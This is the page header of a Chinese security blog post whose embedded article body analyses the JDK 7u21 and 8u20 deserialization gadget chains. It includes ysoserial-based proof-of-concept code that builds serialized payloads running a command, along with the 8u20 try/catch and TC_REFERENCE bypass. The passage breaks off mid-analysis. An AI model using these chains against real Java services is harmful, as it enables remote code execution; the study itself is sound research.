<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„ ç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦ jdk">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ" />
<meta property="og:description" content="å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„ ç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦ jdk" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-05-10T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-07-02T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="jdk7u21&amp; 8u20 æ·±åº¦åˆ†æ"/>
<meta name="twitter:description" content="å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„ ç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦ jdk"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "jdk7u21\u0026 8u20 æ·±åº¦åˆ†æ",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jdk7u218u20-%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "jdk7u21\u0026 8u20 æ·±åº¦åˆ†æ",
  "name": "jdk7u21\u0026 8u20 æ·±åº¦åˆ†æ",
  "description": "å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„ ç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦ jdk",
  "keywords": [
    
  ],
  "articleBody": "å‰è¨€ï¼šæœ€è¿‘ç¼ºå°‘sinkç‚¹ï¼Œçœ‹çœ‹å‰è¾ˆä»¬æ˜¯æ€ä¹ˆåˆ©ç”¨åŸç”Ÿé“¾çš„\nç„¶åjdk7u21å¯¹å…¶æ„é€ ç»†èŠ‚è¿›è¡Œäº†ä¸€äº›åˆ†æå§ï¼Œè‡ªæˆ‘æ„Ÿè§‰åˆ†æçš„æŒºå…¨çš„äº†ï¼Œæ²¡å•¥éš¾åº¦\njdk8u20ä¸»è¦æ˜¯æ ¹æ®å‚è€ƒç§è·³è·³ç³–é‚£ç¯‡æ–‡ç« ï¼Œå­¦ä¹ çš„ã€‚æœ‰ç‚¹éš¾åº¦çš„ã€‚æ€è·¯åˆ°ä¸éš¾ï¼Œå°±æ˜¯æœ€åé‚£ä¸ªæŠ¥é”™çš„å®Œå…¨ç†è§£ä»€ä¹ˆåŸå› ä»¥åŠæ€ä¹ˆå¤„ç†ï¼æ„Ÿè§‰å‚è€ƒæ–‡ç« é‚£ä¸ªç‚¹ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œäºæ˜¯æ ¹æ®è‡ªå·±çš„ç†è§£åˆå»ç¢ç£¨ç¢ç£¨äº†é‚£ä¸ªç‚¹\njdk7u21 ç®€çŸ­æ¦‚è¿°ä¸‹å§ï¼Œåˆ©ç”¨AnnotationInvocationHandler#invokeæ–¹æ³•ä¸­åŠ¨æ€ä»£ç† è°ƒç”¨çš„æ–¹æ³•ä¸ºequalsæ—¶å¯¹åº”ifé€‰é¡¹é‡Œä»£ç ï¼Œå…¶ä¼šé€šè¿‡(forå¾ªç¯åå°„è°ƒç”¨)å»è°ƒç”¨typeå±æ€§çš„æ‰€æœ‰æ–¹æ³•ï¼ˆè¿™é‡Œä¹Ÿå°±è®¾ç½®typeä¸ºTemplates.classï¼Œç„¶åè°ƒç”¨çš„å¯¹è±¡ä¸ºequals(obj)çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œobjæ˜¯TemplatesImplå³å¯è¿›è¡Œåˆ©ç”¨ï¼‰\nç„¶åè¿˜æœ‰ä¸ªéš¾ç‚¹æ˜¯hashçš„åˆ¤æ–­ï¼Œåˆ©ç”¨mapçš„equalsï¼Œéƒ½éœ€è¦æ„é€ ä¸€ä¸ªhashç›¸ç­‰çš„ä¸œè¥¿ï¼ˆè¿™é‡Œ7u21ä½œè€…çš„è®¾è®¡è¿˜æŒºæœ‰æ„æ€çš„ï¼‰é‚£å°±ä¸€èµ·ç®€å•çœ‹çœ‹å§\nè°ƒç”¨é“¾\nLinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() è¿™é‡Œå…¶å®åˆ°Proxy(Templates).equals()å‰éƒ½æ˜¯ä¸ºäº†è¿›å…¥equalsè¿™æ­¥ifï¼Œå‰é¢éƒ½æ˜¯ä¸ºäº†hashç›¸ç­‰çš„æ„é€ ï¼ˆä¹Ÿå°±æ˜¯æ ¸å¿ƒsinkåˆ©ç”¨æ­¥éª¤åªæœ‰åé¢è¿™æ®µï¼‰\npoc pocæ˜¯ç›´æ¥ç”¨çš„ysoserialçš„\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.Jdk7u21; import ysoserial.payloads.util.Gadgets; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class jdk7u21_poc { public static void main(String[] args) throws Exception { Object templates = Gadgets.createTemplatesImpl(\"calc\"); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \"_auxClasses\", (Object)null); Reflections.setFieldValue(templates, \"_class\", (Object)null); map.put(zeroHashCodeStr, templates); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } hash é“¾å­æ•´ä½“æ²¡å•¥è®²çš„ï¼Œå¾ˆç®€å•ã€‚ä¸»è¦æ˜¯hashé‚£\nä¸»è¦è¦æ»¡è¶³ä¸¤æ¬¡è¿›å…¥putæ—¶ï¼Œhashè¦ä¸€æ ·ï¼Œä¸”ç¬¬ä¸€æ¬¡è®¾ç½®çš„key(å°±æ˜¯ç¬¬äºŒæ¬¡çš„k)å¾—æ˜¯TemplatesImplï¼ˆå› ä¸ºè¿™ä¸ªæ˜¯ä½œä¸ºæœ€åinvokeçš„objectè¿›è¡Œè°ƒç”¨çš„ï¼‰ä¹Ÿå°±æ˜¯è¯´proxyputè°ƒç”¨å‰ï¼Œå¾—æœ‰ä¸€ä¸ªå­˜å‚¨å€¼keyå¾—æ˜¯TemplatesImplä¸”hashè¦å’Œproxyè®¡ç®—å‡ºçš„hashç›¸åŒ\npublic class HashSet\u003cE\u003e{ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { for (int i=0; i\u003csize; i++) { E e = (E) s.readObject(); map.put(e, PRESENT); } ç„¶åè¿™é‡ŒTemplatesImplçš„hashcode()è°ƒç”¨æ˜¯ç›´æ¥è°ƒç”¨Objectçš„hashcode()\nè€Œproxyçš„hashcode()è¿™é‡Œåˆ™æ˜¯æœ‰å¯¹åº”çš„å¤„ç†æ–¹å¼ï¼ˆè¿™é‡Œå…¶å®å¯ä»¥æ§åˆ¶è¿”å›0ï¼Œä½†æ˜¯TemplatesImplçš„hashcode()ä¸å¯èƒ½ä¸º0ï¼Œæ‰€ä»¥ä¸èƒ½è¿™æ ·æ„é€ \nprivate int hashCodeImpl() { int var1 = 0; Map.Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Map.Entry)var2.next(); } return var1; } this.memberValueså¯ä»¥åˆå§‹åŒ–è®¾ç½®ï¼Œå¯ä»¥çœ‹åˆ°è¿”å›çš„æ˜¯var1\nvar1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) private static int memberValueHashCode(Object var0) { Class var1 = var0.getClass(); if (!var1.isArray()) { return var0.hashCode(); ç„¶å7u21çš„ä½œè€…æ˜¯çˆ†ç ´äº†ä¸€ä¸ª((String)var3.getKey()).hashCode()çš„å€¼ä¸º**0**çš„æ•°(\"f5a5a608\")\nç„¶åå†è®©var3.getValue()ä¸ºç¬¬ä¸€æ¬¡å­˜å‚¨çš„TemplatesImplä¸ºåŒä¸€ä¸ªå¯¹è±¡ï¼Œå³å¯å®ç°å’Œç¬¬ä¸€æ¬¡çš„hashå€¼ç›¸ç­‰\nå·§çš„ç‚¹å°±åœ¨è¿™hhhï¼Œæˆ‘ç¬¬ä¸€åä¹‰è‚¯å®šæƒ³ä¸åˆ°ä¸€ä¸ªæœ‰å€¼çš„String.hashcode()çš„å€¼ä¼šä¸º0ï¼ï¼\n[*] String hashcode \u0026 æ•´å½¢æº¢å‡º ç„¶åå°±å¥½å¥‡å‘€ï¼Œå°±å»çœ‹ä»£ç äº†ï¼Œå‘ç°æ˜¯æº¢å‡ºå¯¼è‡´çš„è´Ÿæ•°ä»è€Œå¯¼è‡´å¯ä»¥å¾—åˆ°0è¿™ä¸ªå€¼hhhï¼ŒæŒºæœ‰æ„æ€çš„ï¼Œç¬¬ä¸€æ¬¡ç›´è§‚æ„Ÿå—åˆ°æ•´å½¢æº¢å‡ºçš„åˆ©ç”¨\nç„¶åå†™äº†ä¸ªå°demoï¼Œæ„Ÿè§‰æŒºæœ‰æ„æ€çš„\npublic class hashtest { public static void main(String[] args) throws Exception { System.out.println(Integer.MAX_VALUE); // è¾“å‡º 2147483647 System.out.println(Integer.MIN_VALUE); System.out.println(2147483647*100); System.out.println(2147483647*2); System.out.println(2147483647+1); System.out.println(-2147483648-1); System.out.println(-2147483648*3); System.out.println(2147483647*3); System.out.println(\"\".hashCode()); } } è¾“å‡º 2147483647 -2147483648 -100 -2 -2147483648 2147483647 -2147483648 2147483645 0 ç„¶åå¯¹intçš„å€¼åŸŸçš„ç†è§£ï¼Œå…¶å®ç±»ä¼¼ä¸€ä¸ªç¯å½¢ï¼ˆæœ€å°å€¼è¿æ¥ç€æœ€å¤§å€¼ï¼Œmin-1=maxï¼Œmax+1=minï¼‰\nè¿™é‡Œç®€å•è§£é‡Šä¸‹-2147483648*2 = 0 ï¼Œ2147483647*2 = -2\nè¿™é‡Œå…¶å®å°±æ˜¯äºŒè¿›åˆ¶ä¸‹å³ç§»ä¸€æ­¥\n-2147483648æ˜¯10000000 00000000 00000000 00000000å³ç§»åç›´æ¥00000000 00000000 00000000 00000000ä¹Ÿå°±ä¸º0äº†\n2147483647æ˜¯01111111 11111111 11111111 11111111å³ç§»å11111111 11111111 11111111 11111110ï¼Œè¿™é‡Œå¼€å¤´æ˜¯1è¦é‡‡ç”¨è¡¥ç æœºåˆ¶ï¼Œå³ä¸º-å·ï¼Œç„¶åå–åå†+1\nå–å00000000 00000000 00000000 00000001+1å¾—00000000 00000000 00000000 00000010ç„¶åç¬¦å·\næ‰€ä»¥ä¸º-2hhï¼Œéƒ½å¿«å¿˜äº†hh å¾ˆæ˜ç™½äº†å§\n[*] å€¼2 å½“ç„¶è¿™é‡Œå€¼è‚¯å®šä¸æ­¢f5a5a608ä¸€ä¸ªï¼Œä½†æ˜¯å‘¢æˆ‘å¯èƒ½æƒ³ä¸åˆ°æº¢å‡ºä½†æ˜¯æˆ‘è‚¯å®šä¼šæƒ³åˆ°\"\"ç©ºå€¼\næˆ‘ä»¬çœ‹åˆ°Stringçš„hashé»˜è®¤æ˜¯ä¸º0çš„\nå†çœ‹Stringçš„hashCode()ä»£ç ï¼Œæ˜¯ä¸æ˜¯åªæœ‰ä¸è¿›å…¥è¿™ä¸ªifï¼Œå³å¯å¾—åˆ°hashä¸º0çš„å­—ç¬¦ä¸²äº†å‘¢\nä¹Ÿå°±æ˜¯è®©length\u003c=0å³å¯ï¼Œå³\"\".hashCode()ï¼ŒéªŒè¯å¯è¡Œhh\nç„¶åå…¶å®è¿™é‡Œequalsçš„è§¦å‘ï¼ŒCC7çš„mapæˆ‘è§‰å¾—ä¹Ÿå®Œå…¨æ²¡é—®é¢˜ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹æˆ‘CC7çš„å‡ ç§ç»•è¿‡hashç›¸ç­‰çš„é—®é¢˜\nputç‚¹ è¿˜æœ‰ä¸€ä¸ªå…³äºputé¡ºåºçš„pocè®¾è®¡å§ï¼Œä¹Ÿæ˜¯ç±»ä¼¼CCé“¾çš„ã€‚\nmapè¿™ä¸ªå€¼å­˜æ”¾åˆ°AnnotationInvocationHandler.this.memberValuesç”¨äºhashçš„è¿ç®—\nç„¶åè¿™é‡Œmapæ²¡æœ‰ç›´æ¥å­˜TemplatesImplå¯¹è±¡ï¼Œå› ä¸ºä¸‹æ–¹LinkedHashSet#addä¼šè§¦å‘map#put-\u003ehashçš„æ£€æµ‹â€”â€”\u003eè§¦å‘equalsè°ƒç”¨-\u003eè§¦å‘sinkæŠ¥é”™ä¸­æ–­\næ‰€ä»¥è¿™é‡Œç­‰LinkedHashSet#addå®Œï¼Œå†putè¦†ç›–æˆå¯¹åº”çš„TemplatesImplå¯¹è±¡ï¼Œå…¶ä»–åº”è¯¥æ²¡å•¥è¯´çš„äº†è¿™æ¡é“¾å­\n7u21çš„ä¿®å¤ å¯¹æˆ‘ä»¬typeè¿›è¡Œäº†ç±»å‹é™åˆ¶ï¼Œå¯¼è‡´æˆ‘ä»¬å°†typeè®¾ç½®æˆTemplates.classæ—¶ä¼šthrowé”™è¯¯ä¸­æ–­æˆ‘ä»¬çš„ååºåˆ—åŒ–ï¼Œ\njdk8u20 è¿™é‡Œä¸»è¦ä¾é çš„æ˜¯@1nhannå¸ˆå‚…é‚£ç¯‡æ–‡ç« ï¼Œä¸è½»æ¾æ\né’ˆå¯¹7u21çš„ç»•è¿‡ï¼Œä¸»è¦åˆ©ç”¨ä¸¤ä¸ªç‰¹æ€§\nåŒå±‚try/catch TC_REFERENCE åŒå±‚try/catch ç›´æ¥å†™çœ‹ä¸ªdemoå§ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼šå‘ç°é‡Œå±‚tryä¼šthrowé”™è¯¯ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™å¹¶ä¸ä¼šç›´æ¥ä¸­æ–­ç¨‹åºï¼Œç›¸å½“äºé‡Œå±‚try/catchéƒ½å±äºå¤–å±‚tryçš„ä»£ç ï¼Œæ‰€ä»¥è¿™æ—¶åº”è¯¥è·³è½¬åˆ°å¤–å±‚çš„catchï¼Œè€Œå¤–å±‚catchæ²¡æœ‰throwæ—¶åé¢çš„ä»£ç ä¾ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œ\nå½“ç„¶è¿™é‡Œå¤–å±‚catchæ˜¯throwçš„è¯ï¼Œè¿™ä¸ªä¼šè¿”å›bitch2\nè¿˜æœ‰ä¸€ç‚¹å¤–å±‚catchçš„æ•è·ç±»å‹è¦åŒ…å«å†…å±‚çš„throwï¼Œå¦‚æœå¤–å±‚æ˜¯IOExceptionï¼Œå†…å±‚æ˜¯Exceptionï¼Œè¿™æ—¶å°±ä¼šæ•è·ä¸åˆ°ï¼Œç„¶åæŠ¥é”™ç»ˆç«¯\npublic class error { public static void main(String[] args) throws Exception { try { try { int i = 1/0; }catch (Exception e){ throw new Exception(\"bitch\"); } }catch (Exception e){ // }catch (IOException e){ // throw new Exception(\"bitch2\"); ; } System.out.println(\"fuck\"); } } è€ŒAnnotationInvocationHandler#readObjectä¸­æ˜¯å…ˆå°±æ‰§è¡Œäº†s.defaultReadObject();å†å¯¹typeè¿›è¡Œçš„åˆ¤æ–­\nè¿™æ ·ä¹Ÿå°±æ˜¯ï¼Œè¿›è¡Œtypeåˆ¤æ–­åçš„ä»£ç ï¼Œæˆ‘å…¶å®å¹¶ä¸éœ€è¦ï¼ˆgadgetä¸ç”¨åé¢çš„è°ƒç”¨ï¼‰ï¼Œæˆ‘åªéœ€è¦AnnotationInvocationHandlerå¯¹è±¡è€Œå·²ï¼Œæ‰€ä»¥è¿™é‡Œé åŒå±‚try/catchèƒ½è®©AnnotationInvocationHandlerè¿˜åŸå¯¹è±¡å³å¯ï¼Œtypeåé¢çš„ä»£ç æ‰§è¡Œä¸äº†ä¹Ÿæ— æ‰€è°“\næ‰€ä»¥gadgetä¸­å¦‚æœæœ‰ä»£ç èƒ½æ»¡è¶³è¿™ä¸ªä¸€ä¸ªä¾‹å­ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½è®©AnnotationInvocationHandler#readObjectä¸ä¸­æ–­ç¨‹åºäº†å‘¢\n{ try{ os.readObject(); //è¿™ä¸ªè¿›è¡ŒAnnotationInvocationHandler#readObject } catch (Exception e){ ; //ç„¶åä¼šè·³è½¬åˆ°è¿™è¡Œæ¥ï¼Œåªè¦ä¸æ˜¯ä»€ä¹ˆå¼ºåˆ¶é€€å‡ºçš„ä»£ç æ˜¯ä¸æ˜¯å°±èƒ½ç”¨äº†å‘¢ } } ç„¶åè¿˜æœ‰ä¸€ç‚¹è¦è€ƒè™‘ï¼Œå°±æ˜¯æ®µä»£ç è¦èƒ½è¢«æˆ‘ä»¬gadgetè°ƒç”¨ä¸”èƒ½æ§åˆ¶oså€¼ä¸ºæˆ‘ä»¬AnnotationInvocationHandleråºåˆ—åŒ–æ•°æ®\nè¿™é‡Œjava.beans.beancontext.BeanContextSupport å°±åˆšå¥½æ»¡è¶³æˆ‘ä»¬çš„æ¡ä»¶ï¼Œè¿™ä¸ªç±»çš„ readObject() ï¼Œè°ƒç”¨äº† readChildren(ois);ä¸‹å›¾å…¶ä»£ç ä¸­å¯ä»¥çœ‹åˆ°catchæ˜¯æ»¡è¶³æ¡ä»¶çš„\nprivate synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable \u003e 0 \u0026\u0026 this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } TC_REFERENCE è¿™ä¸ªç®€å•è¯´å°±æ˜¯ï¼Œjavaåºåˆ—åŒ–/ååºåˆ—åŒ–å¯¹æ¯ä¸ªå¯¹è±¡äº§ç”Ÿæ—¶éƒ½è®¾ç½®äº†ä¸€ä¸ªHandlerå€¼(ç±»ä¼¼ç´¢å¼•)ï¼Œè€Œä½ ç¬¬äºŒæ¬¡è°ƒç”¨åŒä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œjavaä¼šç›´æ¥é€šè¿‡è¿™ä¸ªHandlerå€¼æ‰¾åˆ°ç¬¬ä¸€æ¬¡ç”Ÿæˆçš„å¯¹è±¡è¿›è¡Œè°ƒç”¨\nè¿˜æ˜¯é€šè¿‡demoè¯´ä¸‹å§ï¼ˆè¿™ä¸ªç‰¹æ€§ç»•è¿‡fastjsonåŸç”Ÿé“¾é‚£ä¸ªæ˜¯åŒä¸€ä¸ªï¼‰æ‡’ï¼Œdemoä¹Ÿæ˜¯ç›´æ¥copyçš„ï¼Œåˆ«å–·\nimport ysoserial.Serializer; import java.io.File; import java.io.FileOutputStream; public class Test { public static void main(String[] args) throws Exception{ Fuck f = new Fuck(); Object[] l = {f,f}; byte[] ser = Serializer.serialize(l); writeFile(ser,\"1.txt\"); } public static void writeFile(byte[] content,String path) throws Exception{ File file = new File(path); FileOutputStream f = new FileOutputStream(file); f.write(content); f.close(); } } å°±è¿™é‡Œä¸æ˜¯æœ‰2ä¸ªfä¹ˆï¼Œéƒ½è°ƒç”¨çš„åŒä¸€ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œåºåˆ—åŒ–æ—¶ï¼Œåªä¼šç»™ç¬¬ä¸€ä¸ªfå®Œæ•´çš„åºåˆ—åŒ–ï¼Œè€Œç¬¬äºŒä¸ªfåˆ™å­˜å‚¨ç¬¬ä¸€ä¸ªfçš„Handlerï¼Œè€Œååºåˆ—åŒ–æ—¶ï¼Œä¹Ÿæ˜¯å…ˆååºåˆ—åŒ–ç¬¬ä¸€ä¸ªfï¼Œåˆ°ç¬¬äºŒä¸ªfè¿˜åŸå¯¹è±¡æ—¶ï¼Œç›´æ¥æŠŠç¬¬ä¸€ä¸ªfçš„å¯¹è±¡ç»™ä»–\nå…³äºHandlerçš„ä¸€ä¸ªå°çŸ¥è¯†ï¼Œåºåˆ—åŒ–æ•°æ®é‡Œé¢ ç¬¬ä¸€ä¸ªHandlerå€¼éƒ½æ˜¯ @Handler - 8257536 (0x7E0000)ï¼Œç„¶åæ¯æ–°äº§ç”Ÿä¸€ä¸ªHandlerï¼Œå€¼+1ï¼Œç¬¬äºŒä¸ªHandlerå°±ä¸º8257537\nåˆ©ç”¨æ€è·¯ ç„¶åè¯´äº†è¿™ä¹ˆå¤šåˆ°åº•æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿ\nè¿˜è®°å¾—7u21æˆ‘ä»¬ç”¨çš„LinkedHashSetä¼ äº†ä¸€ä¸ªå€¼ï¼Œåé¢hashç¢°æ’\næˆ‘ä»¬è®©BeanContextSupportåŒ…è£¹AnnotationInvocationHandlerç„¶åæ”¾åœ¨ç¬¬ä¸€ä½//ç”¨äºè¿˜åŸAnnotationInvocationHandlerå¯¹è±¡ TemplatesImplæ”¾ç¬¬äºŒä½ï¼Œå’Œ7u21ä¸€æ ·ç”¨äºhashçš„ç¢°æ’ Proxyæ”¾ç¬¬ä¸‰ä½ï¼Œå…¶ä¸­ä»£ç†ç±»å’Œæˆ‘ä»¬BeanContextSupportåŒ…è£¹çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡å°±è¡Œäº† è¿™æ ·ä¼šå…ˆååºåˆ—åŒ–BeanContextSupportå¯¹è±¡ï¼Œå°±ä¼šæŠŠAnnotationInvocationHandlerè¿˜åŸäº†ã€‚ç„¶åproxyåˆ©ç”¨æ—¶ç›´æ¥é€šè¿‡Handlerè°ƒç”¨è¿˜åŸäº†çš„AnnotationInvocationHandlerå¯¹è±¡ï¼ˆåé¢å°±å’Œ7u21ä¸€æ ·äº†\npoc æŠ¥é”™ å‰è¨€ï¼šè·³è·³ç³–é‚£ç¯‡æ–‡ç« å¾ˆå¥½ï¼Œä½†æ˜¯å…³äºæœ€åé‚£ä¸ªæŠ¥é”™é—®é¢˜æˆ‘è§‰å¾—å…‰çœ‹é‚£ç¯‡æ–‡ç« è‚¯å®šæ˜¯æä¸æ˜ç™½çš„ä»¥åŠä¸ºä»€ä¹ˆåˆ é‚£ä¸¤ä¸ªæ•°æ®ï¼Œä¸ºä»€ä¹ˆä¸èƒ½æ·»åŠ å‘¢ï¼Ÿä¸ºä»€ä¹ˆåˆ é™¤äº†æ•°æ®ä¼šä¸å‡ºä¹±å­è€Œå¯ä»¥æ­£å¸¸åˆ©ç”¨å‘¢ï¼Ÿå…¶å®éƒ½æ²¡äº¤ä»£ï¼ˆè‡³å°‘åœ¨æˆ‘çš„è§†è§’ä¸‹æ˜¯è¿™æ ·çš„ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘èœ!^!ï¼‰ï¼Œç„¶åç¬”è€…ä¸‹é¢è®°å½•çš„å…‰çœ‹è‚¯å®šä¹Ÿæ˜¯ç†è§£ä¸äº†ï¼Œè¦è‡ªå·±æ‰¾åˆ°å¯¹åº”ç‚¹è°ƒè¯•å’Œå¯¹åº”åºåˆ—åŒ–æ•°æ®æ‰èƒ½ä½“ä¼šå…¶ä¸­çš„çœŸæ„\nç›´æ¥copyçš„pocï¼Œç„¶åä¹Ÿå¾ˆå¥½ç†è§£å§ï¼Œä½†æ˜¯åˆäº§ç”Ÿäº†ä¸€ä¸ªæ–°çš„æŠ¥é”™ï¼ï¼ï¼ï¼ˆä¸ºäº†ææ˜ç™½è¿™ä¸ªæŠ¥é”™ä¹Ÿæ˜¯èŠ±è´¹äº†ä¸€äº›æ—¶é—´ï¼‰\nimport ysoserial.Deserializer; import ysoserial.Serializer; import ysoserial.payloads.util.Gadgets; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import ysoserial.payloads.util.Reflections; import javax.xml.transform.Templates; import java.beans.beancontext.BeanContextSupport; import java.lang.reflect.InvocationHandler; import java.util.HashMap; import java.util.LinkedHashSet; public class Poc { public static void main(String[] args) throws Exception{ TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(\"calc.exe\"); InvocationHandler ih = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class,new HashMap\u003c\u003e()); Reflections.setFieldValue(ih,\"type\", Templates.class); Templates proxy = Gadgets.createProxy(ih,Templates.class); BeanContextSupport b = new BeanContextSupport(); Reflections.setFieldValue(b,\"serializable\",1); HashMap tmpMap = new HashMap\u003c\u003e(); tmpMap.put(ih,null); Reflections.setFieldValue(b,\"children\",tmpMap); LinkedHashSet set = new LinkedHashSet();//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy set.add(b); set.add(templates); set.add(proxy); HashMap hm = new HashMap(); hm.put(\"f5a5a608\",templates); Reflections.setFieldValue(ih,\"memberValues\",hm); byte[] ser = Serializer.serialize(set); Deserializer.deserialize(ser); } } ç„¶åè¿è¡Œä¼šäº§ç”Ÿä¸€ä¸ªå› ä¸ºreadInt()çš„æŠ¥é”™ï¼Œè€Œè¿™ä¸ªæŠ¥é”™å½’åŠŸäºAnnotationInvocationHandler\nException in thread \"main\" java.io.EOFException at java.io.DataInputStream.readInt(DataInputStream.java:392) at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823) ä¸€ç›´è°ƒè¯•è·Ÿè¸ªåˆ°readBlockHeader()è¿™é‡Œreturn 